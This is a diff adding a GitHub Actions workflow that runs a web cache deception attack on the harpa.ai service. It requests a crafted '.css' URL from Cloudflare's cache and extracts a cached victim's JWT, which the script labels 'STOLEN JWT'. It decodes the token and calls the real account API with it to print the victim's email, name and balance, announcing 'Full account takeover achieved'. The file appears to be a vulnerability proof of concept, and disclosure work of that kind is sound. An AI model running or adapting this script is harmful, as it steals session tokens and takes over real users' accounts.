@@ -1,0 +1,96 @@
+name: WCD JWT Extraction (Cross-Region Proof)
+
+on:
+  workflow_dispatch:
+    inputs:
+      unique_id:
+        description: 'Unique ID for the WCD URL (e.g., proof-123). The full URL will be: harpa.ai/library/extracts-you-tube-links/6728a0c222b006c16f7f4645%23<unique_id>.css'
+        required: true
+        type: string
+
+jobs:
+  extract:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Show runner location
+        run: |
+          echo "=== GitHub Actions Runner Info ==="
+          echo "Runner: $(hostname)"
+          echo "Region: GitHub-hosted (US Azure datacenter)"
+          echo ""
+          echo "=== Cloudflare PoP this runner hits ==="
+          curl -s 'https://harpa.ai/cdn-cgi/trace'
+          echo ""
+
+      - name: Extract JWT from Cloudflare cache
+        run: |
+          URL="https://harpa.ai/library/extracts-you-tube-links/6728a0c222b006c16f7f4645%23${{ github.event.inputs.unique_id }}.css"
+
+          echo "=== Target URL ==="
+          echo "${URL}"
+          echo ""
+
+          echo "=== Fetching from Cloudflare CDN ==="
+          curl -s -D /tmp/headers.txt "${URL}" \
+            -H 'Accept-Encoding: gzip, deflate, br' --compressed \
+            -o /tmp/body.txt 2>/dev/null
+
+          echo "=== Response Headers ==="
+          grep -iE '(cf-cache-status|cf-ray|^age:|cache-control)' /tmp/headers.txt
+          echo ""
+
+          echo "=== JWT Extraction ==="
+          JWT=$(grep -oP '"jwt":"ey[^"]*"' /tmp/body.txt 2>/dev/null | head -1)
+
+          if [ -n "$JWT" ]; then
+            TOKEN=$(echo "$JWT" | sed 's/"jwt":"//;s/"//')
+            echo "STOLEN JWT: ${TOKEN}"
+            echo ""
+
+            echo "=== JWT Decoded ==="
+            python3 -c "
+          import base64, json
+          from datetime import datetime
+          t='${TOKEN}'.split('.')[1]
+          t+='=='
+          d=json.loads(base64.urlsafe_b64decode(t))
+          print(f'User ID:  {d[\"id\"]}')
+          print(f'Issued:   {datetime.fromtimestamp(d[\"iat\"])}')
+          print(f'Expires:  {datetime.fromtimestamp(d[\"exp\"])}')
+          print(f'Validity: {(d[\"exp\"]-d[\"iat\"])/(365.25*24*3600):.1f} years')
+          "
+            echo ""
+
+            echo "=== Account Takeover ==="
+            curl -s 'https://api.harpa.ai/api/v1/auth/account' \
+              -H "Authorization: Bearer ${TOKEN}" \
+              -H 'Content-Type: application/json' | python3 -c "
+          import sys, json
+          a = json.load(sys.stdin).get('account', {})
+          print(f'Email:         {a.get(\"email\")}')
+          print(f'Name:          {a.get(\"firstName\")} {a.get(\"lastName\")}')
+          print(f'User ID:       {a.get(\"id\")}')
+          print(f'Created:       {a.get(\"createdAt\")}')
+          spaces = a.get('spaces', [])
+          if spaces:
+              print(f'Token Balance: {spaces[0].get(\"token\", {}).get(\"balance\")}')
+          "
+            echo ""
+            echo "============================================="
+            echo "  ATTACK SUCCESSFUL FROM GITHUB US SERVERS"
+            echo "  Victim clicked a harpa.ai link (from India)"
+            echo "  JWT extracted from US datacenter"
+            echo "  Full account takeover achieved"
+            echo "============================================="
+          else
+            JWT_NULL=$(grep -c '"jwt":null' /tmp/body.txt 2>/dev/null || echo 0)
+            echo "No JWT found."
+            echo "jwt=null count: ${JWT_NULL}"
+            echo ""
+            echo "Possible reasons:"
+            echo "  1. No logged-in user has visited this URL yet"
+            echo "  2. Cache expired (TTL: 1 hour)"
+            echo "  3. URL was first accessed without auth cookies"
+            echo ""
+            echo "Make sure a logged-in user visits the URL BEFORE running this workflow."
+          fi
